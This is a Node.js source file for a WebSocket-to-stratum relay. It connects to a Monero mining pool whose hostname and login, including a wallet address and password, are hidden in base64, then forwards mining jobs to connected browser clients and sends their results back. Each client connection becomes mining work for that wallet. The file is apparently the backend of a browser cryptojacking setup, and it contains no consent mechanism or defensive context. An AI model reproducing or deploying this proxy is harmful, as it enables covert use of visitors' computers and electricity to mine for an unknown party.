const { WebSocketServer } = require('ws')
const express = require('express')
const http = require('http')
const net = require('net')

let mMiner = null
let mSocket = {}
let mJob = null
let mUser = 1

const app = express()

let server = http.createServer(app)

server.listen(9099, ()=>{
    console.log('Listening on port 9099')
})

const wss = new WebSocketServer({ server })

wss.on('connection', (socket) => {

    mSocket[mUser] = socket
    let key = mUser

    mUser++

    socketConnection(key, socket)
})

// net.createServer(function(socket) {
    


// }).listen(PORT, () => {  
//     console.log('Server PORT: '+PORT)
// })


connectClient()

function connectClient() {
    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
        mMiner = client
        mJob = null
        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
    }).on('data', (data) => {
        try {
            let result = data.toString().trim()
            if (mJob == null) {
                mJob = result
            }

            for (let socket of Object.values(mSocket)) {
                socket.send(result)
            }
        } catch (error) {}
    }).on('end', () => {
        mMiner = null
        mJob = null
        setTimeout(() => {
            connectClient()
        }, 2000)
    }).on('error', () => {
        mMiner = null
        mJob = null
        setTimeout(() => {
            connectClient()
        }, 2000)
    })
}

function socketConnection(key, socket) {
    if (mJob) {
        socket.send(mJob)
    }

    socket.on('message', (data) => {
        let result = data.toString()
        if (mMiner) {
            mMiner.write(result+'\r\n')
        }

        try {
            console.log(JSON.parse(result))
        } catch (error) {
            console.log(result)
        }
    })

    socket.on('error', () => {
        delete mSocket[key]
    })
}


app.get('/', async function (req, res) {
    res.end('USER: '+mUser+'\nACTIVE: '+Object.keys(mSocket).length)
})
